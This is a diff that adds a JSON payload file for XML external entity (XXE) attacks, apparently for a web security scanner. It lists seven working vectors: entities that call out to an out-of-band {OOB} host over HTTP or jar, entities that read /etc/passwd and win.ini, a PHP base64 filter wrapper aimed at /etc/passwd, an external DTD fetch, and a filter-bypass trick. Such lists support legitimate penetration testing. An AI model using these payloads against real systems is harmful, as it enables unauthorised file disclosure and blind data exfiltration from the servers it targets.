@@ -1,0 +1,42 @@
+{
+  "class": "xxe",
+  "order": "bypass-first",
+  "note": "OOB-capable — oob_register before the first probe; {OOB} resolved at send time. Targets: parsers accepting external entities.",
+  "payloads": [
+    {
+      "id": "xxe::01",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://{OOB}/xxe\">]><r>&x;</r>",
+      "note": "classic external entity to OOB HTTP"
+    },
+    {
+      "id": "xxe::02",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
+      "note": "file disclosure (linux)"
+    },
+    {
+      "id": "xxe::03",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///c:/windows/win.ini\">]><r>&x;</r>",
+      "note": "file disclosure (windows)"
+    },
+    {
+      "id": "xxe::04",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://{OOB}/xxe-dtd\">%p;]><r/>",
+      "note": "external DTD retrieval (OOB, blind)"
+    },
+    {
+      "id": "xxe::05",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>",
+      "note": "php wrapper (php backends)"
+    },
+    {
+      "id": "xxe::06",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % d SYSTEM \"jar:http://{OOB}!/\">%d;]><r/>",
+      "note": "jar protocol (java backends)"
+    },
+    {
+      "id": "xxe::07",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x \"x\"><!ENTITY % y \"&#38;x;\">%y;]><r>&x;</r>",
+      "note": "parameter-entity recursion filter bypass"
+    }
+  ]
+}
